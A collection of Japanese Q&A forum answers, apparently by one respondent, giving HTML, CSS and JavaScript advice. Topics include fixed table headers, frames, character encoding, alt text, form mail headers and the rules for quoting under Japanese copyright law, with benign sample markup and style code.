仕様書に書かれている内容程度は、まず仕様書に目を通す癖をつけましょう。 それでもわからないときに質問すると、間違った情報や不完全な情報で済ますことがなくなります。 3.2.4 コメント ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから マーク付け宣言開始区切り子「<!」とコメント開始区切り子「--」の間に空白文字があってはならないが、コメント終了区切り子「--」とマーク付け宣言終了区切り子「>」の間には空白文字があってもよい。 よくある間違いに、コメント中に連続したハイフン「---」を入れることがある。著者は、コメント中に2つ以上連続するハイフンを含めないようにしなければならない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［On SGML and HTML (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　念のため--自身がわかりやすくするため-- <!-- ここからコメント ・・・・・ ・・・・ --> 　と半角スペースは入れています。(自身が見やすいから) 　HTMの仕様書(邦訳)は、とてもよくできています。一度全部に目を通して置かれると、必要なとき必要な場所を見つけられます。
私も初心者で生意気な事言えませんが サーバーはレンタルでしょうか？ Perlはどこのサーバーでもインストール済みですので、 phpとmysqlで作ると楽だと思います。 mysql、phpデーターベースは図書やフリーで沢山ありますので ファイル数が多くなく簡単そうなプログラムをちょっと改造して mbdをcsvに変換してmysqlにインポートすれば簡単だと思います。
＞ヘッダを固定してボディのみスクロールするため、CSSでthead の tr と、tbody に float:left; を指定しているからです。 　floatの用途を間違えています。 　floatは本来、テキスト中に挿絵などがあるとき、その要素をフローとさせて、その周囲にテキストを回りこませるためのものです。floatでブロックを並べるテクニックは、確かによく見かける手法ですが、そのために文書構造を変えなければならない----floatさせる要素は回り込む要素の前に書かなければならない---という重大な問題があります。これはHTMLやスタイルシートの目的とかけ離れています。使うならabsoluteでしょう。 　しかし、floatやabsolute、fixedは、他の要素から完全に切り離されますから、列のセル幅を引き継げません。tableの描画ルーチンに従わなくなります。 　もう一点、tableの扱いはブラウザごとに大きな差があります。また根本的な問題として、tableには他のブロック要素に使えるプロパティが使えません。height/overflowなど・・ 　そのような表を作成される場合は、table,thead,tfoot,tr,tdの各要素をblock要素に置き換えて、幅をセルごとにきちんと指定して配置するのが無難です。 ＿<table class="scroll" summary="scrollTbody"> ＿＿<thead> ＿＿＿<tr> ＿＿＿＿<th>あ行</th><th>か行</th><th>さ行</th><th>た行</th> ＿＿＿</tr> ＿＿</thead> ＿＿<tbody> ＿＿＿<tr> ＿＿＿＿<td>あ</td><td>か</td><td>さ</td><td>た</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>あ</td><td>か</td><td>さ</td><td>た</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>い</td><td>き</td><td>し</td><td>ち</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>う</td><td>く</td><td>す</td><td>つ</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>え</td><td>け</td><td>せ</td><td>て</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>お</td><td>こ</td><td>そ</td><td>と</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>あ</td><td>か</td><td>さ</td><td>た</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>い</td><td>き</td><td>し</td><td>ち</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>う</td><td>く</td><td>す</td><td>つ</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>え</td><td>け</td><td>せ</td><td>て</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<td>お</td><td>こ</td><td>そ</td><td>と</td> ＿＿＿</tr> ＿＿</tbody> ＿</table> に対して table.scroll,table.scroll *{display:block;margin: 0;padding:0;line-height:30px;} table.scroll{width:428px;margin-top:50px;border-bottom:1px solid gray;} table.scroll thead,table.scroll tbody{width:100%;border:none;} table.scroll tbody{height:94px;overflow:auto;width:428px;} table.scroll thead th,table.scroll tbody td{float:left;width:100px;border:solid gray 1px;} /* 本来はfloatではなくdisplay:inline-blockとすべきだが後方互換のためやむなくfloat */ table.scroll tbody,table.scroll tbody tr{clear:left;}
HTMLやCSSがどのように書かれているか知らない私には、さっぱりわかりません。 それをご存知なのは、あなただけですから、原因はあなたにしかわかりません。 　ひとつの外部スタイルシートを読み込まれているのでしたら、それぞれのHTMLの文書構造が異なる。 　HTML自体で指定しているなら、HTMLが異なる。
　サーバーによって使用するMTA(Mail Transfer agent)の設定が異なるのでしょう。 　sendmailか、最近良く見かけるqmailだと思います。 　フォームから送信されたデータは、あなたのサーバーのプログラムで処理され、CGIに渡されます。そのCGIが、MTAに指示を与えるのですが、その指示によってForm: の内容は変える事ができます。 　fromがないときのデフォルトが、ドメイン名になっているのでしょう。 　空白は、お勧めしません。迷惑メールフィルターではねられたりします。 　　きちんとfrom:の値を指示しましょう。 　なお、合わせて、Replay-to: 返信先、も設定しましょう。 　
PHPやPERLなどの、サーバーサイドプログラムを使うことになりますね。それ以外の方法はないです。基本的な文法さえ分かればできるはずです。ただ、一切の知識無く、誰かのソースコピペでやりすごせるほど簡単じゃないと思います。
event.preventDeafult()してください。 document.addEventListener("touchmove", function(e){e.preventDefault();}, false);
.csvに関連付けされたファイルタイプ(MIME)を変更すれば可能です。 .htaccess mimeなどのキーワードでどうぞ。
＞ＨＴＴＰ_ＲＥＦＥＲＥＲが理解できなく、もしまた教えていただけそうなら大変助かります。 ( http://oshiete.goo.ne.jp/qa/7528781.html ) ★Enviroment Variable and FORM,COOKIE ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi ) 　の中ほど 　ちなみに、このURLの後ろに、/abc/lingwood.html?name=lingwood　とか付けてみると・・ 　先に紹介したHTMLをそのまま出力するCGIは、とても便利です。上で紹介した/abc/lingwood.htmlをつけると、ユーザーには完全にlingwood.htmlとして利用されます。 　今回、ダメだといったのは、「表示させたいページ」内で、「埋め込まれるページ」のデザインではなく、「表示させたいページ」のスタイルを適用させたい希望だからなのです。
HTMLは、javascriptから操作できます。 つまり、action属性にどんな値が入っていようが、後からなんとでも加工ができるということです。 ちなみに、額面通りに？を解釈すると、表示中のページにデータが送信されます。
具体的に、日本語としてどんな意味を持つタグが欲しいのですか？ 辞書通りに、「強調」の対義語「曖昧・漠然」を指すタグはないですよ。
#1さんの回答で正しいのですが、念のため書いておくと、 絶対パスは「/index.php」のような形で、「/hogehoge.com/」からのパスです。 相対パスは「./index.php」のような形で、そのファイルのフォルダ「/hogehoge.com/test/」からのパスになります。 ですので、 href="./index.php"で望み通りの動作になると思います。
決してしてはならない手法です。 　はっきり言うと、他人の著作物を自分の著作物のように見せかけることは、著作権云々の前にマナーとしてしてはなりません。 　他人の著作物を引用することは、権利として認められていますが、そのためにはルールがあります。 ・引用であることを明確に示すこと ・出所を明示すること ・一切変更してはならないこと ・その文書中で量的にも質的にも主でないこと 　→著作権法第３２条( http://www.cric.or.jp/db/article/a1.html#032 ) 　これは、他人の著作物を利用するときの最低限のルールです。 たとえば、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 第三十二条　公表された著作物は、引用して利用することができる。この場合において、その引用は、公正な慣行に合致するものであり、かつ、報道、批評、研究その他の引用の目的上正当な範囲内で行なわれるものでなければならない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［著作権法( http://www.cric.or.jp/db/article/a1.html#032 )］より 　のように引用します。 　一方、リンクは参照ですから、「どの本の何ページをご覧ください」は、引用ですらありませんから、自由に出来ます。 　本当に基本的な問題ですが、とっても大事なことなのです。 　実はiframeが、推奨されない理由のひとつにこれがあるのです。必要なとき必要最小限の形で引用の形態で引用しましょう。
＞ＨＴＭＬなんか特にdiv,li,tdなんかのオンパレードだし、視覚的に？読みにくいしあまりにも構造化されて何をどう定義しているのか直感的に入ってきません。 　そりゃそうです。お馬鹿な機械相手に、マークアップしてやらないと彼らは理解できないからです。人なら、何度か読めば文書の構成はわかります。小学校のとき、起承転結とか主語述語、主文とか・・ 　機械に理解できるように、人が苦労しなければなりません。幼い子に何かを教えるのと同じです。そのためには、教える内容以上にはるかに深くその件について知っていなければなりません。小さな子供に電球がなぜ灯るかを教えようとしたら、電気について深く深く知ってないと教えられませんよね。直感じゃ無理です。 　もともとHTMLは、SGML ( http://ja.wikipedia.org/wiki/SGML )を参考に、より人が扱いやすいように工夫されたものです。SGMLなんて人が扱える代物じゃない。 　先の回答で例示した「「非スクロールのサイドバー( http://oshiete.goo.ne.jp/qa/7521059.html )」」のHTMLなんて、そんなにとっつきにくいものではないはずです。小学校の国語の時間に戻って、文章を読み解き、タグを使って、足りなきゃdivやspanにclass名を組み合わせて、お馬鹿な機械にわかるようにマークアップすればよいのですよ。---最初にデザインなんて余計なことを考えるから難しくなるのです。class名は、HTML5の「新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」名を参考にすればよい。 　問題を複雑にしているのは、デザインのためにHTMLを書こうとしているからですよ。 　 　
HTML4.01,CSS2.1で指定可能な色のキーワードは、 →HTML4.01strict 6.5色 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　%Color; ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　Black,Green,Silver,Lime,Gray,Olive,White,Yellow,Maroon 　Navy,Red,Blue,Purple,Teal,Fuchsia,Aqua →CSS2.1 4.3.6 Colors ( http://www.w3.org/TR/CSS2/syndata.html#color-units ) 　aqua,black,blue,fuchsia,gray,green,lime,maroon,navy, 　olive,(orange),purple,red,silver,teal,white,yellow (注) CSS2では、HTML4.01と同じ16色でした。CSS3では16色 　ただ、ウェブ標準ではありませんが、Netscape Navigatorやその後継のMozilla firefoxでは、 darkslategray ( http://www.netstrider.com/tutorials/HTMLRef/color/ ) 　に、あるような多くの色コードを理解します。 　私は、色はわかりやすいrgb()を使うことが多いです。
たとえば 　　<table summary="th"> 　　　　<thead> 　　　　　　<tr><td>Color Name</td><td>Hexadecimal Code</td></tr> 　　　　</thead> 　　　　<tbody> 　　　　　　<tr><td>steelblue</td><td>4682B4</td></tr> 　　　　　　<tr><td>royalblue</td><td>4169E1</td></tr> 　　　　　　<tr><td>cornflowerblue</td><td>6495ED</td></tr> 　　　　　　<tr><td>lightsteelblue</td><td>B0C4DE</td></tr> 　　　　　　 とかだと、screenメディアに対して table[summary="th"] {line-height:1.6em;} table[summary="th"] thead{position:fixed;z-index:1} table[summary="th"] td{background-color:white;} table[summary="th"] tbody{display:block;position:relative;top:1.6em;} とか。 なお、印刷時には、theadは各ページに配分されるのでスタイルシートの必要はありません。
<TABLE BORDER=0> <TR><TD rowspan=2 colspan=2><IMG SRC="画像１"></TD><TD><ＩＭＧ　SRC="画像2"></TD></TR> <TR ALIGN="CENTER"><TD><ＩＭＧ SRC="画像3"></TD></TR> </TABLE>
間違えた・・ HTML5用、HTML4.01用共に #content_Table{position:fixed;top:200px;left:5px;width:30%;} ですみです。 HTML4.01なら body>div.section>*{margin-left:31%;} 5なら body>section{padding-left:31%;} で左を開けておく。色々な書き方がある。 ごく簡単な例です。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済み、ウェブ標準のHTML4.01strict + CSS2.1です。 タブは＿に置換してあるので戻すこと。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- #content_Table{position:fixed;top:200px;left:5px;width:30%;top:100px;} body>div.section{padding-left:31%;width:69%;background-color:aqua;} /* 質問と関係ない部分 */ html,body{margin:0;padding:0;} p{margin:0 auto;text-indent:1em;} div.section div.section{min-height:400px;} div.header,div.section,div.footer{margin:0 auto;} div.header h1,div.section h2,div.footer h2{margin:0 auto;} #content_Table{background-color:yellow;} div.header{height:100px;background-color:lime;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1 id="TOP">サンプル</h1> ＿</div> ＿<div class="section"> ＿＿<h2>本文</h2> ＿＿<div class="section" id="section1"> ＿＿＿<h3>第一章</h3> ＿＿＿<p>・・</p> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<h3>第二章</h3> ＿＿＿<p>・・</p> ＿＿</div> ＿＿<div class="section" id="section3"> ＿＿＿<h3>第三章</h3> ＿＿＿<p>・・</p> ＿＿</div> ＿＿<div id="content_Table"> ＿＿＿<h3>目次</h3> ＿＿＿<ol> ＿＿＿＿<li><a href="#TOP">トップ</a></li> ＿＿＿＿<li><a href="#section1">1章</a></li> ＿＿＿＿<li><a href="#section2">2章</a></li> ＿＿＿＿<li><a href="#section3">3章</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿</div> </body> </html>
おっと・・ほんとにTypoがありました・・。 } がひとつたりませんでした。 あと、整形のために全角スペースを使用していますので、そのままコピペより、 手書きで入力したほうがよいかと思います。 [誤] 　　dfltTxt = 0; } [正] 　　dfltTxt = 0; 　} }
クリッカブルマップは、仕様書にはあっても最近ではほとんど見かけません。スタイルシートのほうが、はるかに優れているからです。 　スタイルシートで、透明度を指定した要素をかぶせるとか・・
質問文に ＞DIVタグのstyleで二つの画像を左右の端に標示することは可能でしょうか？ と書かれていて ＞しかし、ショッピングモールなんでスタイルシートが使えないんです。 って矛盾してますけど・・・ 外部スタイルシートは使えないけど、style属性でのスタイルシートが使えるなら ＿<ul style="display:block;margin:0;padding:0;list-style:none;text-align:center;"> ＿＿<li style="display:block;margin:0;padding:0;list-style:none;"><img src="./images/1.jpg" width="360" height="270" alt="ノートの全体写真"> ＿＿＿<p style="display:inline;margin-left:10px;"><img src="./images/1-1.jpg" width="360" height="270" alt="中央を拡大した写真"></p> ＿＿</li> ＿＿<li style="display:block;margin:0;padding:0;list-style:none;"><img src="./images/2.jpg" width="360" height="270" alt="ノートの全体写真右"> ＿＿＿<p style="display:inline;margin-left:10px;"><img src="./images/2-1.jpg" width="360" height="270" alt="右部分を拡大した写真"></p> ＿＿</li> ＿</ul>
1.PCやスマフォからHPを見たとき、正しく表示できる幅のピクセルは何ピクセルでしょうか？ スマフォ用に320ｐｘで作りますか？でもそのデザインをそのまま大型モニターに持ってきても正しくは表示されるでしょうが、デザイン的には見難くなると思います。 端末やサイトの作りにより、何が正しいのかの定義により、答えが異なるかな。 作りや定義によっては、すべて正しく表示できるし、定義によっては正しく表示できない。 2.CSSで動的にPCやスマフォ向けに適してた幅に合わせることはできるのでしょうか？ 可能。レスポンシブ　デザイン・レイアウト　を学んでください。cssでの振り分けだと メディアクエリを利用することになると思います。 検索し、上位に来たものです。手法・メリット・注意点・デザインなど、どんなものかをさーっと把握されることをお勧めします。 ●流行期を過ぎたレスポンシブ・Webデザインのこれから http://ascii.jp/elem/000/000/695/695819/ ●ゼロからはじめるレスポンシブWebサイトを作るために勉強できるサイトをまとめました http://www.html5-memo.com/html5/responsive/ ●簡単なサンプルで学ぶ！ゼロからはじめるレスポンシブWebサイト初級編 ～メディアクエリを使ってCSSを分岐させる～ http://www.html5-memo.com/css3/mediaqueries-samp … ●スマホ対応でレスポンシブwebデザインを実装しようとしてヤメた理由 http://www.misclog.com/tech/760/ ●レスポンシブWebデザイン作例集 http://kunkun.pya.jp/basic_design/web_design/res …
＞なぜALT属性がすべて検索結果に表示されるのでしょうか。 　Lynxで一度ページをご覧ください。googleは、どれが重要かわからないときは、文章内の適当な語句を収集します。画像は見えてません。altしか見えない・・ 　続きがあります。 Google のクローラでは、画像に含まれるテキストは認識されません。 　画像に何が書かれているかは一切見えません。 テキスト コンテンツの代わりに画像を使用する必要がある場合は、ALT 属性を使用して簡単な説明テキストを組み込みます。 　alt属性に書かれている内容を収集するので、そこに書きましょう。 Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。 　ウェブマスターとしては必須のツールです。というか、忙しいときは画像なしでこれでネットサーフィンするほうが早い・・キーボードだけでスラスラと。 　googleは、十年以上前からdiscriptionなんて使ってません。ある目的(SPAM判定とか)のため以外は・・ 　たとえ画像を使おうと、テキストブラウザで見たときには <div class="header"> 　<h1><img alt="ページのタイトル"></h1> 　<h2><img alt="要約</h2< 　<p><span>このページでは<span><strong><img alt="商品名"></strong><span>について</span></p> </div> <div class="section"> 　本文 </div> <div class="footer"> 　フッター </div> と書かれていれば、正確に理解して表示してくれます。
＞同じドメインで、３つのページが出てくることはありえますか。 　ふつうにあります。 　検索結果に、必要なければrobot.txtやmetaタグでクロール不要と命令しておきます。コンテンツごとにというサイトリンクは無理です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ウェブサーバーの robots.txt ファイルを活用します。このファイルでは、クロールを実行するディレクトリと実行しないディレクトリを指定できます。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より
1)ボタン上のテキストを書き換えられるようにしたい。 　意味不明なのですが、スタイルシートで書き換えると言う意味ですか？ 2)ボタンはページによって同じ背景画像でサイズを変えたい。 　（指定した縦横幅に合わせて背景画像がリサイズされるようにしたい） 　主語がどれですか？ 　　「ボタンは」・・「サイズを変えたい」と言う意味？(1)とどう違うの？ 　指定された＝固定された＝縦横幅に合わせて？？？？指定されてりゃリサイズする必要はないのでは 　なお、CSS3のbackground-sizeは非適合ブラウザが結構あるので、背景ではなく画像としたほうが良いのでは？ 3)背景画像ごとリンクにしたい。 　基本的にa要素は内部に行内要素しか含むことができない(HTML5はできる)ので、画像にリンクを・・ 　そのとき、画像上のボタンのリンクも有効にならなければならないのでしょうね。z-indexかソース上の順番で調整する。 　なお、もっと根本的な問題が・・何でもかんでも<div>を使うべきではありません。あくまでナビゲーションでしたら 　<div class="nav"> 　　<ul> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　</ul> 　</div> とマークアップしましょう。デザインのためにHTMLを記述したらダメです。スタイルシートを解釈しないブラウザや検索エンジンに情報を伝えられません。 『Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。 ( http://support.google.com/webmasters/bin/answer. … )』 　先で、まったくデザインを変えたくなっても手を着けられなくなりますよ。
そもそもページ数が多いことと、ページの追加、削除、変更がある可能性を考えると、JavaScriptやPHPなどのプログラムで自動育成をすることになると思います。
　サーバーへは、テキストモードで転送します。バイナリではありません。テキストモードで転送すると、サーバーの改行コードに合わせます。 　通常は、 <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> 　の記述があれば、HTTP応答ヘッダに関わらず、ブラウザはそれに従うはずです。元々はサーバーが<meta>を理解してくれる想定でしたが、そのような動作をするサーバーはありません。 ＞PCでアクセスした時にUTF-8で表示され文字化けされてしまいます。 　これをどのように判断されたのか疑問です。もし、ブラウザの文字エンコーディングでUTF-8を選択すると、きちんと表示されるのでしたら 「ファイルもSHIFT_JISで保存しているのにも関わらず」 を疑います。ローカルでブラウザからそのファイルを開いたら・・・ 　もし、ブラウザのエンコーディングでUTF-8を選択するときちんと表示されるのでしたら、文字コードがUTF-8で保存されています。 　一方、ブラウザのエンコーディング指定を(正確には)Shift_JISにすると、きちんと表示されるなら、ブラウザが文字コードをUTF-8と判断しているということですから 　HTMLの前に、UTFと判断する何か余分なものが入っていませんか? たとえばBOM(unicodeサイン)とかが残っている。UNICODEの文字--空白とか--が入っているとか。 　サーバーの応答ヘッダは、firefoxをご利用でしたら、Live HTTP Headers( https://addons.mozilla.jp/firefox/details/3829 )と言うアドオンで調べることが出来ます。 　また、 Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) 　でURLを指定してチェックすると、文字コードの一致性が判別できます。それ以外を原因とするエラーもチェックできます。
Java(JavaScriptではないですよね？)の話を持ち出されているということは、ホームページを作ったことはないけど、データベースやなんらかのプログラミングはできるということでしょうか？ まず、補足内の内容に回答しますと、サーバー側で動くプログラムのことをCGIと言います。多くのCGIには、PHPやPerlが用いられますが、CでもJavaでもJavaScriptでもCGIとして利用できます。ただし、これは技術的に可能であるという意味で、初心者さんにとっては、かなりの障害があるでしょう。 本題ですが、まず、まったくのプラグラム未経験ということであれば、データーベースをいきなり扱うのは時期尚早です。分かりやすく言うと、無茶です。 Webサイトをつくるのに必要な技術はいろいろありますが、 1.情報をまとめる能力 2.デザイン能力 3.デザインをHTML/CSSに変換する能力 4.HTML/CSSを自動で操作・育成するプログラムをつくる能力(JavaScriptやPHPなど) 5.データの保存、検索、読み込みを管理する能力(データベース) 6.プラグラムを保管するシステム自体をチューニングする能力(サーバー) こらくらいですかね。 他にもSEOとかマーケティングとか言い出したらきりがないですが、初心者さんが手を出せるのは、せいぜい1～3までです。4からの技術は1～3前提になるので、初期の段階で考えても意味がないです。 従って、質問にある2以降はまず、基礎を身につけてから考えてはどうでしょう。今、ここに答えがあってもおそらく意味がわからないと思います。 5の質問だけに答えますと、閲覧できないクライアントがあると、その分、ホームページを見てもらう率が下がるというだけのことです。趣味のホームページで間口が狭くていいのなら、たとえばIE限定でも問題ないですよ。(もちろん、商用でのWeb制作は別ですよ) 質問者さんにとっての一番確実な解は、まずはHTML/CSSをマスターしてくださいということです。 話はそれから。といった印象。
そもそも、枠内にデータがないのに２列目、４列目とはどういう意味でしょう。 データがないのに、空の行を見栄えのためだけにHTMLを記述するのは間違いです。 　表は決してデザインのために使用してはなりません。 ・ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　表はあくまで、「縦横に関連のあるデータを組み立てるだけ」です。 　行ではなく、セルにデータがない場合は、 border-collapse: border-spacing: empty-cells: 　の各プロパティを組み合わせて希望のデザインにします。その行すべてデータがない場合も同様ですが、その場合は空の行をおくのではなく。これらを使って行間のスペースを開けるべきです。 ごく簡単な例　ウェブ標準HTML4.01strict+CSS2.1 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済み ※　タブは＿に置換してあるので戻すこと。 HTMLに無駄なものは一切ないです。携帯電話だろうが検索エンジンだろうが利用できる。読み上げブラウザが空の行を読み上げない。excelやメモ帳などにコピペとかデータの再利用がそのままできる。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- table[summary="行間広げる"]{ ＿border:none; /* table自体には枠なし */ ＿border-collapse: separate;/* セル間を広げる */ ＿border-spacing: 0 2em; /* その間隔は上下２文字、左右0 */ ＿empty-cells: show; /* 内容のないセルもボーダーをつける */ ＿margin:0 auto; /* ページの中央に */ } table[summary="行間広げる"] th, table[summary="行間広げる"] td{ ＿padding: 0.2em 1em; /* セル内余白 上下0.2文字幅、左右１文字 */ ＿border:ridge gray 4px;/* ポーターの種類と幅、色 */ } table[summary="行間広げる"] td{border-left-width:0px;}/* tdのボーダーは消す */ --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<table summary="行間広げる"> ＿＿<tbody> ＿＿＿<tr> ＿＿＿＿<th abbr="title">＼</th><td>１列</td><td>２列</td><td>３列</td><td>４列</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="L1">１行目</th><td>１列</td><td>２列</td><td></td><td>４列</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="L2">２行目</th><td>１列</td><td>２列</td><td>３列</td><td>４列</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="L3">３行目</th><td>１列</td><td>２列</td><td>３列</td><td>４列</td> ＿＿＿</tr> ＿＿＿<tr> ＿＿＿＿<th abbr="L4">４行目</th><td>１列</td><td>２列</td><td>３列</td><td>４列</td> ＿＿＿</tr> ＿＿</tbody> ＿</table> </body> </html>
あまり必要ないと思いますが・・・リンク自体も。 ブラウザのコンテキストメニューに「画像に名前をつけて保存」があるはずなので、画像がほしい人は画像を右クリックして表示されるコンテキストメニューから選択してもらえばよいだけです。 　titleがワンテンポ遅れて表示されるのは、ユーザビリティの観点から、タイトルが必要ならマウスを乗せたままにしておくと、はじめて表示されるほうがやさしいからです。いきなり出てきたら周囲の何かが隠される。 　それをすぐ表示させるのは、おせっかいすぎるような気がします。--できますが--- 　大きな画像へリンクしている場合は、いずれにしてもHTMLソースを書き加えなきゃならない。 　<a href="*****/abc.jpg" title="大きな画像へ"><img ***** alt="***"></a> 　
＞フレームってそんなに古い技術なのですか。 ＞メニューがページと一緒にスクロールされないのが便利で使ってたのですが、 　いくつか理由があります。 1) 仕様書の『HTML文書を作る場合には、この仕様における、他のDTDセット(frameset,transitinal)ではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 2) HTML フレーム 問題 - Google 検索 ( https://www.google.co.jp/#hl=ja&safe=off&output= … ) ＞メニューがページと一緒にスクロールされないのが便利で使ってたのですが、 　その場合は、面倒でも各ページにメニューを置き、スタイルシートのfixedで固定することが多いです。 　HTML4.01の勧告(1999年)以来、言われ続けてきたのは「(文書)構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」「広汎なWebアクセス性の考慮 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」です。HTMLには「どの部分が見出し、どの部分がナビゲーション・・」とマークアップするだけにして、プレゼンテーションはすべてスタイルシートに任せることです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Style Sheets in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　現在もっとも問題になるのが、フレームで構成されたページを携帯電話やスマートフォンのような小さなディスプレイで見ると見づらいこと、ブックマークに登録できないこと、検索エンジンが理解できないことなどでしょう。それぞれに合わせてページを作成することは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。・・・【中略】・・・なぜならただ1種類の文書しか作る必要がなくなるからだ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　フレームではなく、率直に文書構造だけを記述したHTMLを作成し、スタイルシートでデザインするなら、単に「メニューを固定する」以上に、もっともっと気の利いた形にできますよ。
＜Link　ルールが変わった？＞ 　変わっていません。!!!!　もしそうなったら過去の膨大なデータが利用できなくなります。 　まず、きちんとリンクしない原因を確かめないと、対処できませんから、No.2で示した方法で原因を確認すること。 ＞WEBをバージョンアップしてから 　WEB(World wide Web- http://ja.wikipedia.org/wiki/World_Wide_Web )をバージョンアップなんてできません。 　たぶんブラウザだと思いますが、他のブラウザでも確認してください。
すみません、No.2のスクリプトを訂正します。 たぶん、これでいいと思います。 <script> onload=function(){ var div=document.getElementsByClassName('main-menu')[0]; var img=document.getElementsByClassName('main-content')[0].getElementsByTagName('img')[0]; img.style.position='relative'; img.style.top=((div.clientHeight-img.clientHeight)/2)+'px'; }; </script> >No.1さん ついでで申し訳ありませんが、お気を悪くされましたら済みません。 自分でHTMLを作って質問文とはまるきり別物にしてしまう（私はそう感じます）方もいらっしゃるので。 ともあれどこまで同じにすべきか、どこまで書き換えるべきか、というのも難しいと思いますけどね。 わたしは「一行目テキスト二行目テキスト」という言葉だけを見て、段落が１つか、２つにすべきかというのを判断できませんので、可能な限り質問文に従っています。 --------- 段落１つでデザイン的に分離するのは、 2chなど（中国国内の商品パッケージ？）でよくみかけるこういうタイトルデザインみたいなのです。 日本語の文法として存在しなくても、HTMLの文法では存在し得ますから。 （画像添付できなかったので、URL添付で。 http://kohada.2ch.net/test/read.cgi/pcnews/13369 … ） <hgroup> <h1>iOS6に3DMap搭載か！動画あり</h1> <h2><span>GoogleMap</span><span>さようなら</span></h2> </hgroup> <style> hgroup { position: relative;width:100%;height:5em;} h1{position:absolute;left:6em;top:0;} h2 {position: absolute;top:0;} h2 span{left:0;} h2 span:before{content:"【";} h2 span:after{content:"】";} h2 span+span{position:relative;left:20em;} </style> なんかもうちょっとマシなスタイル考えないと、、、
